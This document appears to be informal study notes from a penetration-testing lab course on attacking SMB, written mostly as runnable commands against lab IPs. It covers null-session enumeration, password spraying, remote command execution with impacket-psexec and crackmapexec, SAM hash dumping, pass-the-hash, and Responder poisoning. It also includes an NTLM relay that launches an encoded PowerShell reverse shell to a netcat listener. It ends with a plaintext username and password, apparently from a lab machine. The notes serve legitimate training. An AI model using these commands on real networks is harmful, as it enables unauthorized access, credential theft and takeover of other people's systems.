1- smb is communication protocol to share file ,hosting files and access printers
2- designed to run on top of NetBIOS over TCP/IP PORT 139
3- UDP ports `137` and `138`  over NetBIOS
4- run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer.

`linux,windows comaptibilty:`
Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services

`MSRPC RUNNING OVER SMB AS TRANSPORT LAYER`

#### What is RPC (Remote Procedure Call)?
**Remote Procedure Call (RPC)** is a protocol that allows a program to execute code or services on another computer over a network, as if it were running locally.
`msrpc microsoftrpc`

## Enumeration
```shell-session
AhmaDb0x@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
```
## Misconfigurations
null sessions smb


#### File Share

Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.

Attacking SMB
#### smbclient + smbmap
```shell-session
AhmaDb0x@htb[/htb]$ smbclient -N -L //10.129.14.128
```
smbmap:
```shell-session
AhmaDb0x@htb[/htb]$ smbmap -H 10.129.14.128
notes

```
-r for browse
```shell-session
AhmaDb0x@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
```
```shell-session
 notes                                                   READ, WRITE
```
```shell-session
AhmaDb0x@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell-session
AhmaDb0x@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```


#### Remote Procedure Call (RPC)
`rpcclient`
[cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

```shell-session
AhmaDb0x@htb[/htb]$ rpcclient -U'%' 10.10.110.17
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

```shell-session
AhmaDb0x@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
```

#### no nullsessions ?
credentials needed
best practices ? target a list of usernames with one common password.
avoid account lockouts.

```
its good to know the threshold , wait 30 min or 60 min betweeen atempts
```

#### Password Spray
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth --continue-on-success


--local-auth : non domain joined
cme stops win it hists valid user
use `--continue-on-success` 
```
linux:
```
when attacking smb usually we only get access to the file system , abuse priv , exploit known vuln cve;s 
```
windows:
```
if the user we compromides has high priv 
- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)
```

#### Remote Code Execution (RCE) with SMB
Sysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows

PSEXEC:
```
execute procces in other machien
full interactivity for console applications,
```
how it operates:
```
It works because it has a Windows service image inside of its executable

takes this service and deploys it to the admin$ share (by default) on the remote machine

it starts the PSExec service on the remote machine

PSExec service then creates a [named pipe] that can send commands to the system.

```
what is name piped:
```
its method to enter inter proccess comunictation (IPC).

allows different processes to communicate with each other, either on the same system or over a network.


- One process writes data to the pipe.
- Another process reads from it.
- This allows two programs to talk to each other **securely and efficiently**.

```
- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

#### Impacket PsExec
```shell-session
AhmaDb0x@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```
The same options apply to `impacket-smbexec` and `impacket-atexec`.

#### CMD or PowerShell using `CrackMapExec`
`-x` to run cmd commands or uppercase `-X` to run PowerShell commands.
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

#### Enumerating Logged-on Users
in the netwrok
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Extract Hashes from SAM Database
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH)
We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## Forced Authentication Attacks
abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

`Responder`. [Responder] is an LLMNR, NBT-NS, and MDNS poisoner

#### LLMNR
Link-Local Multicast Name Resolution
**LLMNR** is a Windows **name resolution protocol
used when dns fails.
resolve names to IP addresses

📌 **Port Used:** UDP/5355  
📌 **Default Status:** Enabled in Windows networks
✅ **Disabling LLMNR in Group Policy Helps Prevent This Attack!**

#### NBT-NS
**NBT-NS** is an **older name resolution protocol** used when **DNS and LLMNR fail**.
📌 **Ports Used:** UDP/137  
📌 **Default Status:** Enabled in older Windows systems
✅ **Disabling NBT-NS in Group Policy Helps Prevent This Attack!**

#### mDNS
Multicast DNS

**name resolution protocol** used in **MacOS, Linux, and IoT devices**.
📌 **Port Used:** UDP/5353  
📌 **Default Status:** Enabled on MacOS, Linux, and IoT

### **`Responder`**

default
```
set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic
```
```shell-session
AhmaDb0x@htb[/htb]$ responder -I <interface name>
```
scenario: 6 possible way to resolve name to ip
```
user or a system tries to perform a Name Resolution (NR).

The hostname file share's IP address is required.

(C:\Windows\System32\Drivers\etc\hosts) will be checked.

switches to the local DNS cache.

query will be sent to the DNS server that has been configured.

issue a multicast query.

```
assume user search for `\\mysharefoder\` which is wrong
1-all name resolutions will fail
2-machine will send a multicast query to all devices on the network
3- with responder and fake smb server ntlm hash is captured
```shell-session
AhmaDb0x@htb[/htb]$ sudo responder -I ens33
```
```shell-session
[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
-------------------------------------------------------------------------------------- 
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
--------------------------------------------------------------------------------------
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               
--------------------------------------------------------------------------------------
[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               
--------------------------------------------------------------------------------------
[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          
--------------------------------------------------------------------------------------
[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 
--------------------------------------------------------------------------------------
[+] Listening for events... 
```
hash captured:
1- crack using hashcat 
2- relay attacks
All saved Hashes are located in Responder's logs directory 
(`/usr/share/responder/logs/`)
3-hashcat module 5600

```
**Note:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
```

##### **relay attacks**
```
impacket-ntlmrelayx or Responder MultiRelay.py.
```

step-1:
First, we need to set SMB to `OFF` in our responder configuration file 
(`/etc/responder/Responder.conf`).
```shell-session
AhmaDb0x@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```
step-2:
`sam` will be dumped
```shell-session
AhmaDb0x@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
step-3:
execute command OR revshell
[https://www.revshells.com/](https://www.revshells.com/)
```shell-session
AhmaDb0x@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAACkA'
```
```shell-session
AhmaDb0x@htb[/htb]$ nc -lvnp 9001
```
DONE

---





jason:34c8zuNBo91!@28Bszh

impacket-psexec jason:'34c8zuNBo91!@28Bszh'@10.129.158.90



